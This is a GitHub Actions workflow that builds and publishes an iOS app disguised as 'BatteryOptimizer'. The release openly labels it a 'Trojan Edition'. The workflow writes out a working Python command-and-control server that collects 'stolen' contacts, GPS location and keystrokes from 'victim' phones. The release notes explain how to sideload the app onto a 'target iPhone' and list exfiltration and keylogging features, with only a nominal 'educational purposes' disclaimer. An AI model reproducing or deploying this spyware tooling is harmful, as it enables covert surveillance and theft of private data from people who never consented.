name: Build and Release IPA

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: macos-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Setup Xcode
      uses: maxim-lobanov/setup-xcode@v1
      with:
        xcode-version: latest-stable
    
    - name: Install ldid for signing
      run: brew install ldid
    
    - name: Create C2 Server file
      run: |
        cat > c2_server.py << 'EOF'
        import socket
        import threading
        import json
        from datetime import datetime
        
        class C2Server:
            def __init__(self, host='0.0.0.0', port=4444):
                self.host = host
                self.port = port
                self.clients = {}
                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
            def start(self):
                self.server.bind((self.host, self.port))
                self.server.listen(5)
                print(f'[*] C2 Server started on {self.host}:{self.port}')
                
                while True:
                    client, addr = self.server.accept()
                    print(f'[+] New victim connected: {addr[0]}:{addr[1]}')
                    client_id = f'{addr[0]}:{addr[1]}'
                    self.clients[client_id] = client
                    
                    thread = threading.Thread(target=self.handle_client, args=(client, client_id))
                    thread.daemon = True
                    thread.start()
            
            def handle_client(self, client, client_id):
                while True:
                    try:
                        data = client.recv(4096).decode()
                        if not data:
                            break
                            
                        payload = json.loads(data)
                        print(f'\n[{datetime.now()}] Data from {client_id}:')
                        print(f'Type: {payload.get("type")}')
                        print(f'Data: {payload.get("data")}')
                        
                        if payload.get('type') == 'contacts':
                            self.save_data(client_id, 'contacts', payload.get('data'))
                        elif payload.get('type') == 'location':
                            self.save_data(client_id, 'location', payload.get('data'))
                        elif payload.get('type') == 'keylog':
                            self.save_data(client_id, 'keylog', payload.get('data'))
                            
                    except Exception as e:
                        print(f'[-] Error with {client_id}: {e}')
                        break
                        
                client.close()
                del self.clients[client_id]
                print(f'[-] Client disconnected: {client_id}')
            
            def save_data(self, client_id, data_type, data):
                filename = f'stolen_{client_id.replace(":", "_")}_{data_type}.txt'
                with open(filename, 'a') as f:
                    f.write(f'[{datetime.now()}]\n{data}\n\n')
                print(f'[+] Data saved to {filename}')
        
        if __name__ == '__main__':
            server = C2Server()
            server.start()
        EOF
    
    - name: Build Archive
      run: |
        xcodebuild -project BatteryOptimizer.xcodeproj \
          -scheme BatteryOptimizer \
          -configuration Release \
          -archivePath $PWD/build/BatteryOptimizer.xcarchive \
          archive \
          CODE_SIGN_IDENTITY="" \
          CODE_SIGNING_REQUIRED=NO \
          CODE_SIGNING_ALLOWED=NO
    
    - name: Create IPA from Archive
      run: |
        mkdir -p build/Payload
        cp -r build/BatteryOptimizer.xcarchive/Products/Applications/BatteryOptimizer.app build/Payload/
        cd build
        ldid -S Payload/BatteryOptimizer.app/BatteryOptimizer
        zip -r BatteryOptimizer.ipa Payload
        cd ..
        ls -lh build/BatteryOptimizer.ipa
    
    - name: Create Release
      uses: softprops/action-gh-release@v1
      with:
        files: |
          build/BatteryOptimizer.ipa
          c2_server.py
        body: |
          ## Battery Optimizer Pro - Trojan Edition
          
          **Installation:**
          1. Download BatteryOptimizer.ipa
          2. Install via AltStore/Sideloadly/TrollStore
          3. Run c2_server.py on your machine
          4. Launch app on target iPhone
          
          **C2 Server:**
          - Host: 192.168.1.109
          - Port: 4444
          - Command: python3 c2_server.py
          
          **Features:**
          - Contacts exfiltration
          - Real-time GPS tracking
          - Keylogger
          - Background operation
          
          ⚠️ For educational purposes only
        draft: false
        prerelease: false
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: BatteryOptimizer-IPA
        path: build/BatteryOptimizer.ipa